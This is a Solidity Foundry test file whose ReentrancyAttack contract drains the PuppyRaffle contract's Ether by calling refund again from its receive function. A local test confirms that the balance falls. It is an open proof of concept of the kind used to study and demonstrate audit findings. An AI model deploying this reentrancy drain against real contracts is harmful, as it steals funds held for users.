// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {StdInvariant} from "forge-std/StdInvariant.sol";

contract ReentrancyAttack {
    PuppyRaffle public puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    constructor(address _puppyRaffleAddress) {
        puppyRaffle = PuppyRaffle(_puppyRaffleAddress);
    }

    // Starts the attack
    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(indexOfPlayer);
    }

    // Function to receive Ether
    receive() external payable {
        if (address(puppyRaffle).balance > 0) {
            uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(
                address(this)
            );
            puppyRaffle.refund(indexOfPlayer);
        }
    }
}

contract PuppyRaffleTest is StdInvariant, Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttack reentrancyAttack;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address playerFive = address(5);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        reentrancyAttack = new ReentrancyAttack(address(puppyRaffle));
    }

    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testReentrancyAttack() public playersEntered {
        address ATTACKER = address(reentrancyAttack);
        vm.deal(ATTACKER, 2 ether);

        uint256 balanceBefore = address(puppyRaffle).balance;
        vm.prank(ATTACKER);
        reentrancyAttack.attack();
        uint256 balanceAfter = address(puppyRaffle).balance;
        assert(balanceAfter < balanceBefore);
    }
}
